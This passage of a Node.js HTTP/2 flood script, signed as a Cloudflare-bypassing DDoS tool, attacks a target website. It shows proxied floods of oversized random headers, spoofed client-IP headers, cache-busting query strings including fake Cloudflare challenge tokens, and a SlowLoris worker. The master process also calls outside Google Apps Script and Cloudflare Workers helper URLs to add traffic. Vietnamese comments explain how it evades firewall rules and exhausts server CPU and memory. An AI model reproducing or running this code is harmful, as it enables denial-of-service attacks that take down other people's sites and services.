                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    windowUpdateFrame,
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && (frame.flags & 0x1) == 0) {
                                tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) { // Frame type 7 là GOAWAY
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0
                                        statuses["GOAWAY"]++
                                    }
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0)); // Reset stream
                                tlsSocket.end(() => tlsSocket.destroy()); // Đóng kết nối
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))
                // Tạo một chuỗi IP giả lập đi qua nhiều node
                const generateProxyChain = () => {
                    const randomIp = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
                    const clientIp = randomIp();
                    const proxyNode = randomIp();
                    // Trình tự: Client IP, Proxy 1, (có thể thêm Proxy 2)
                    return {
                        client: clientIp,
                        chain: `${clientIp}, ${proxyNode}`
                    };
                };
                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    //const fwq = getRandomInt(0,1);
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90);
                    } else {
                        ratelimit = process.argv[6];
                    }
                    const ips = generateProxyChain(); // Lấy Client IP và Chain IP
                    const spoofedIp = ips.client;     // IP chính đại diện cho client
                    const proxyChain = ips.chain;     // Chuỗi IP giả lập qua proxy
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                    //for (let i = 0; i < 100; i++) {
                        const browserVersion = getRandomInt(120, 123);
                        const parent = streamId > 1 ? streamId - 2 : 0;
                        requests.push(encodePriorityFrame(streamId, parent, 255));
                        //requests.push(encodeWindowUpdate(0, 0x7FFFFFFF));
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            // --- THÊM TỪ GOLDENEYE: Ép server không dùng Cache ---
                            "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
                            "pragma": "no-cache",
                            "connection": "keep-alive",
                            "keep-alive": "timeout=5, max=1000",
                            // --------------------------------------------------
                            ...(reqmethod === "POST" && { "content-type": "application/json", "content-length": Buffer.byteLength(getFastJunk()).toString() }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": ua,
                            "accept": acceptHeaderValue,
                            "x-forwarded-for": proxyChain,
                            "x-real-ip": spoofedIp,
                            "x-forwarded-proto": "https",
                            "x-forwarded-host": url.hostname,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers3 = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            // --- THÊM TỪ GOLDENEYE: Ép server không dùng Cache ---
                            "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
                            "pragma": "no-cache",
                            "connection": "keep-alive",
                            // --------------------------------------------------
                            ...(reqmethod === "POST" && { "content-type": "application/json", "content-length": Buffer.byteLength(getFastJunk()).toString() }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": ua,
                            "accept": acceptHeaderValue,
                            "x-forwarded-for": proxyChain,
                            "client-ip": spoofedIp,
                            "x-cluster-client-ip": spoofedIp,
                            "forwarded": `for=${spoofedIp};proto=https`,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            "sec-fetch-site": currentRefererValue ? ref1 : "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            //...(Math.random() < 0.4 && { "priority": `u=${fwq}, i` }),
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            "via": `1.1 google, 1.1 ${url.hostname}`,
                            "x-originating-ip": spoofedIp,
                            "true-client-ip": spoofedIp,
                            "x-remote-ip": spoofedIp,
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        let combinedHeaders = useLegitHeaders ? headers3.concat() : headers.concat(headers2);
                        const bombHeaders = [];
                        for (let j = 0; j < 20; j++) {
                            // Tạo Key và Value ngẫu nhiên cực nặng (Mỗi cặp ~150-200 bytes)
                            // crypto.randomBytes đảm bảo Server không thể nén dữ liệu này
                            const k = 'x-heavy-' + crypto.randomBytes(4).toString('hex');
                            //const v = crypto.randomBytes(128).toString('base64');
                            const v = getFastJunk(); // Lấy từ kho có sẵn, cực nhanh, không tốn CPU
                            bombHeaders.push([k, v]);
                        }
                        combinedHeaders = combinedHeaders.concat(bombHeaders);
                        function handleQuery(query) {
                            const randStr = () => Math.random().toString(36).substring(2, 9);
                            const timestamp = Date.now();

                            // Giả lập Google Analytics, Facebook Pixel và UTM
                            const trackingParams = [
                                `utm_source=google&utm_medium=cpc&utm_campaign=${randStr()}`,
                                `fbclid=IwAR${randStr()}${randStr()}`,
                                `_ga=GA1.2.${Math.floor(Math.random() * 1000000000)}.${timestamp}`,
                                `gclid=EAIaIQobChMI${randStr()}`,
                                `ref=dtp_${randStr()}`
                            ];

                            const selectedParam = trackingParams[Math.floor(Math.random() * trackingParams.length)];
                            /* pa1
                            Mục đích: Đây là tham số mà Cloudflare thường dùng để quản lý các phiên giải Challenge (trang đợi mà bạn thấy lúc nãy).

Tác động: Bằng cách nhồi một token trông có vẻ "hợp lệ" (có timestamp và chuỗi ngẫu nhiên đúng định dạng), bạn đang cố gắng lừa hệ thống bảo mật rằng request này đã vượt qua bước kiểm tra Challenge từ trước đó. Nó làm request trông "sạch" hơn so với các tham số rác thông thường.
                            pa2 
                            Mục đích: Tạo ra các cặp key=value hoàn toàn ngẫu nhiên.

Tác động: Đây là cách Cache Busting cơ bản nhất. CDN sẽ thấy mỗi request là một yêu cầu dữ liệu hoàn toàn khác nhau, buộc nó không được lấy kết quả cũ từ bộ nhớ đệm mà phải đẩy request về Server gốc để xử lý.
                            pa3 
                            Mục đích: Bắt chước hành vi của người dùng khi sử dụng thanh tìm kiếm (tham số ?q=).

Tác động: Hầu hết các Web Server không bao giờ lưu Cache cho kết quả tìm kiếm. Phương án này nhắm thẳng vào Database (Cơ sở dữ liệu) của đối phương, buộc Server phải thực hiện lệnh truy vấn SQL để tìm chuỗi q ngẫu nhiên đó, gây tốn tài nguyên Backend rất nhanh.
                            pa4 
                            Mục đích: Làm cho request trông giống như trình duyệt đang tải các file phụ (ảnh, script, cấu hình).

Tác động: Kỹ thuật này đánh vào logic phân loại của Firewall. Một số tường lửa thường "nới lỏng" kiểm tra đối với các file tĩnh. Tuy nhiên, bằng cách thêm ?v=${Date.now()}, bạn vẫn ép CDN phải tải lại file liên tục. Nó cũng làm Dashboard của đối phương tràn ngập các yêu cầu file rác, gây khó khăn cho việc lọc IP tấn công.
                            pa5
                            Mục đích: Kết hợp một tham số đã chọn sẵn (selectedParam) với một chuỗi tìm kiếm ngẫu nhiên.

Tác động: Tạo ra sự đa dạng. Nếu bạn dùng mãi một kiểu ?q=, AI của tường lửa sẽ nhận ra mẫu (pattern). Việc có thêm phương án else này giúp luồng request trở nên bất định (không có quy luật), cực kỳ khó để viết luật chặn (Rule) chính xác.
*/
                            if (query === '1') { //Giả lập Cloudflare Token
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {  //Tham số kép ngẫu nhiên (?abc=xyz&def=ghi)
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {  //Giả lập truy vấn tìm kiếm (?q=abc&def)
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '4') {  // Giả lập yêu cầu tài nguyên tĩnh (.js, .css, .png...)
                                const assets = ['.js', '.css', '.png', '.json'];
                                const randomAsset = assets[Math.floor(Math.random() * assets.length)];
                                return `${url.pathname}${randStr()}${randomAsset}?v=${Date.now()}&cache=${randStr()}`;
                            } else if (query === '5') {  // SMART: Tự giữ name=mb và random value
                                return getSmartQuery(target);
                            } else {
                                return `${url.pathname}?${selectedParam}&q=${randStr()}`;
                            }
                        }
                        const finalizedHeaders = shuffleHeaders(combinedHeaders);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(finalizedHeaders)
                        ]);
                        const randomPadding = Math.floor(Math.random() * 16) + 5;
                        requests.push(encodeFrame(streamId, 1, packed, 0x25, randomPadding));

                        // 3. GỬI TIẾP FRAME RST_STREAM (Combo Hủy Diệt - Bào CPU)
                        // Ngay sau khi bắt Server tốn RAM giải mã đống bom, ta bắt nó hủy stream để tốn CPU dọn dẹp
                        //requests.push(encodeRstStream(streamId, 3, 0));
                        streamId += 2;
                        //if (streamId > 0x7FFFFFFF) streamId = 1;
                    }
                    const totalPayload = Buffer.concat(requests);
                    tlsSocket.write(totalPayload, (err) => {
                        if (!err) {
                            // Thay vì setTimeout 1000ms, hãy dùng setImmediate
                            setImmediate(doWrite);
                        } else {
                            tlsSocket.destroy();
                        }
                    });
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}


function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}


setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    // Thay vì reset về 4096, ta giữ mức tối thiểu là 65535
    // Và thỉnh thoảng "nhồi" lên mức cực đại để ép Server tái phân bổ
    if (timer <= 10) {
        custom_header = Math.min(custom_header + 1024, 524288); // Tăng dần đến 512KB
        custom_window = Math.min(custom_window + 65535, 2147483647); // Tăng đến mức tối đa của Int32
        custom_table = Math.min(custom_table + 4096, 65535); // Giữ trần ở 64KB (mức phá RAM tốt nhất)
        custom_update = custom_update + 1;
    } else {
        // "Reset" nhưng không về đáy, mà về mức CAO để duy trì áp lực
        custom_table = 65535;
        custom_window = 15663105;
        custom_header = 131072; // 128KB
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const helperServices = [
        'https://script.google.com/macros/s/AKfycbw6ZjC20a1ZhTBArrCP3NUxuYb6_YvQgjR3Q0izJe2jA6L2Mp4lEfxyKRqLIl9UDbL0/exec?target=',
        'https://script.google.com/macros/s/AKfycbxWwsUXyG3PYGiHdpDORcEOkpiAnV_oZOF40U3CAuC_FIW3rYYSJDlzIWpJQwY0kjrJoA/exec?target=',
        'https://icy-violet-1fb0.nguyenminh27102007.workers.dev/?target=',
        'https://script.google.com/macros/s/AKfycbynC9aiy13ftooTJXXmk56yKeLYq-7txXYkS4a-r7CQBK2SLKg9UlmB0lJ8_zIaBNBm/exec?target=',
        'https://calm-credit-7f5b.coc23102007.workers.dev/?target=',
        'https://white-boat-9d31.coc23102007.workers.dev/?target=',
        'https://calm-lab-b132.webbdominguez2491821.workers.dev/?target='
    ];
    function triggerHelpers(targetUrl) {
        const selectedHelper = helperServices[Math.floor(Math.random() * helperServices.length)];
        console.log(`\x1b[35m[Helper Trigger]\x1b[0m Đang kích hoạt viện trợ từ: \x1b[36m${selectedHelper.split('/')[2]}\x1b[0m cho mục tiêu: \x1b[32m${targetUrl}\x1b[0m`);
        // Dùng https.get để gửi request kích hoạt Helper
        https.get(selectedHelper + encodeURIComponent(targetUrl), (res) => {
            res.resume(); // Giải phóng bộ nhớ nhanh
        }).on('error', (err) => { console.log(`\x1b[31m[Helper Error]\x1b[0m Lỗi khi gọi Helper: ${err.message}`); });
    }
    // Thiết lập vòng lặp kích hoạt Helper mỗi 5 giây
    // Không nên để quá nhanh (như 1 giây) để tránh bị Google/CF quét lạm dụng
    setInterval(() => {
        triggerHelpers(target);
    }, 5000);
    // ------------------------------------
    for (let i = 0; i < threads; i++) {
        const role = (i === 0) ? 'SLOW' : 'FLOOD';
        cluster.fork({
            core: i % os.cpus().length,
            ROLE: role
        });
    }

    const workers = {}

    //Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.clear()
    console.log(`
        \x1b[3;31;40m                            \x1b[38;5;250mAttack sent!
        \x1b[3;31;40m                    \x1b[1;37mAttack order sent by: ducminh
        
        \x1b[3;31;40m               \x1b[38;5;199mHOST      : \x1b[0m\x1b[38;5;46m${url.hostname}
        \x1b[3;31;40m               \x1b[38;5;93mDURATION  : \x1b[0m\x1b[38;5;46m${time}
        \x1b[3;31;40m               \x1b[38;5;57mRATE      : \x1b[0m\x1b[38;5;46m${ratelimit}
        \x1b[3;31;40m               \x1b[38;5;51mTHREADS   : \x1b[0m\x1b[38;5;46m${threads}
        \x1b[3;31;40m               \x1b[38;5;4mMETHOD    : \x1b[0m\x1b[38;5;46m${reqmethod}
        \x1b[3;31;40m               \x1b[38;5;85mScript    : \x1b[0m\x1b[38;5;46mHTTPS-VIP\x1b[0m
        \x1b[3;31;40m               \x1b[38;5;107mINCLUDES  : \x1b[0m\x1b[38;5;46m${url.hostname.includes('cloudflare') ? 'cloudflare' : ''}${url.hostname.includes('akamai') ? 'akamai' : ''}${url.hostname.includes('fastly') ? 'fastly' : ''}${url.hostname.includes('sucuri') ? 'sucuri' : ''}${!url.hostname.includes('cloudflare') && !url.hostname.includes('akamai') && !url.hostname.includes('fastly') && !url.hostname.includes('sucuri') ? 'amazon' : ''}
        `.slice(0, -2)
    );

    cluster.on('exit', (worker) => {
        // Hồi sinh worker với cùng cấu hình cũ
        cluster.fork({
            core: worker.id % os.cpus().length,
            ROLE: worker.process.env.ROLE || 'FLOOD'
        });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    function displayDebugInfo(statuses, startTime, totalTime) {
        console.clear();
        console.log('\x1b[36m╔════════════════════════════════════════════════════╗');
        console.log('\x1b[36m║          Flood Attack DEBUG Dashboard              ║');
        console.log('\x1b[36m╚════════════════════════════════════════════════════╝\n');

        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const progress = Math.min(100, Math.floor((elapsed / totalTime) * 100));
        const totalRequests = Object.values(statuses).reduce((sum, val) => sum + (val || 0), 0);
        const successCount = (statuses['200'] || 0) + (statuses['301'] || 0) + (statuses['302'] || 0) + (statuses['502'] || 0) + (statuses['522'] || 0) + (statuses['503'] || 0);
        const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(2) : 0;

        console.log('\x1b[33mTarget:\x1b[0m', url.hostname);
        console.log('\x1b[33mMethod:\x1b[0m', reqmethod);
        console.log('\x1b[33mProgress:\x1b[0m', `${progress}% (${elapsed}/${totalTime}s)`);
        console.log('\x1b[33mSuccess Rate:\x1b[0m', `${successRate}%`);
        console.log('\x1b[33mTotal Requests:\x1b[0m', totalRequests);

        console.log('┌──────────┬──────────┐');
        console.log('│ Status   │ Count    │');
        console.log('├──────────┼──────────┤');

        if (Object.keys(statuses).length === 0) {
            console.log('\x1b[31m│ No Data  │ 0        │\x1b[0m');
        } else {
            for (const [code, count] of Object.entries(statuses)) {
                let color = '\x1b[32m';
                if (code.startsWith('4') || code === 'GOAWAY') color = '\x1b[31m';
                if (code.startsWith('5')) color = '\x1b[33m';
                console.log(`${color}│ ${code.padEnd(8)} │ ${count.toString().padEnd(8)} │\x1b[0m`);
            }
        }
        console.log('├──────────┴──────────┤');
        console.log(
            '\x1b[31m│\x1b[32m \x1b[33mS\x1b[34mc\x1b[35mr\x1b[36mi\x1b[91mp\x1b[92mt \x1b[93mb\x1b[94my \x1b[95ms\x1b[96mm\x1b[91ms\x1b[92mb\x1b[93mi\x1b[94mn\x1b[95mh\x1b[96mv\x1b[91mn\x1b[0m │'
        );
        console.log('└──────────┴──────────┘');
    }

    if (debugMode) {
        setInterval(() => {
            let aggregatedStatuses = {};
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            aggregatedStatuses[code] = (aggregatedStatuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            displayDebugInfo(aggregatedStatuses, timestamp, time);
        }, 1000);
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    //const port = url.port || (url.protocol === 'https:' ? 443 : 80);
    //for (let j = 0; j < 200; j++) {
    //    setTimeout(() => createSlowLoris(target, port), j * 100);
    //}
    const role = process.env.ROLE;
    if (role === 'SLOW') {
        // CHIẾN THUẬT KÌM CHÂN: Mở socket và giữ nó "thở" chậm
        const port = url.port || (url.protocol === 'https:' ? 443 : 80);
        console.log(`[Worker ${cluster.worker.id}] Đang triển khai SlowLoris...`);

        for (let j = 0; j < 500; j++) {
            setTimeout(() => {
                const socket = net.connect(port, url.hostname, () => {
                    socket.write(`GET ${url.pathname} HTTP/1.1\r\nHost: ${url.hostname}\r\n`);
                    // Gửi thêm header giả mỗi 15 giây để không bị Server đóng kết nối
                    setInterval(() => {
                        if (!socket.destroyed) socket.write(`X-Keep-Alive: ${Math.random()}\r\n`);
                    }, 15000);
                });
                socket.on('error', () => socket.destroy());
            }, j * 50);
        }
    } else {
        console.log(`\x1b[32m[Worker ${cluster.worker.id}] Binh chủng XUNG KÍCH (HTTP/2) đang nhồi...\x1b[0m`);
        let conns = 0

        let i = setInterval(() => {
            if (conns < 100000) {
                conns++

            } else {
                clearInterval(i)
                return
            }
            go()
        }, delay);


        if (debugMode) {
            setInterval(() => {
                if (statusesQ.length >= 4)
                    statusesQ.shift()

                statusesQ.push(statuses)
                statuses = {}
                process.send(statusesQ)
            }, 250)
        }
    }

    setTimeout(() => process.exit(1), time * 1000);
}
/*
script ddos by @smsbinhvn
This script is a part of the bypassing http ddos cloudflare.
*/
